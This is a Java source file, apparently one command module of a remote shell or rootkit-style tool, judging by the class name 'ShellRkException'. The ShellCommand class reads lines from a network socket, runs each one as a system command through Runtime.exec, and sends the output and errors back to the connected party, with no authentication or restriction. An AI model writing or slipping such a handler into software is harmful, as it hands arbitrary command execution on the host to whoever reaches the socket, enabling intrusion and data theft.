package commands;

import exceotions.ShellRkException;
import org.jetbrains.annotations.NotNull;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.Scanner;

public class ShellCommand extends AbstractCommand {

    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_RESET = "\u001B[0m";

    @Override
    public void run() {
        try (Scanner scanner = new Scanner(socket.getInputStream());) {
            PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
            printWriter.print(getTag());
            while (scanner.hasNextLine()) {
                String str = scanner.nextLine();
                try {
                    Process process = Runtime.getRuntime().exec(str);
                    BufferedReader bufferedReader = new BufferedReader(
                            new InputStreamReader(process.getInputStream())
                    );

                    BufferedReader bufferedReaderError = new BufferedReader(
                            new InputStreamReader(process.getErrorStream())
                    );

                    reader(bufferedReader, printWriter);
                    readerError(bufferedReaderError, printWriter);

                    process.waitFor();
                } catch (Exception e) {
                    printWriter.println(ANSI_RED + getTag() + e + ANSI_RESET);
                }
            }
        } catch (Exception e) {
            throw new ShellRkException(e.getMessage());
        }
    }

    private void reader(@NotNull BufferedReader reader,@NotNull PrintWriter printWriter) throws IOException {
        String row;

        while ((row = reader.readLine()) != null) {
            printWriter.println(row);
        }
    }

    private void readerError(@NotNull BufferedReader readerError, @NotNull PrintWriter printWriter) throws IOException {
        String row;

        while ((row = readerError.readLine()) != null) {
            printWriter.println(ANSI_RED + getTag() + row + ANSI_RESET);
        }
    }
}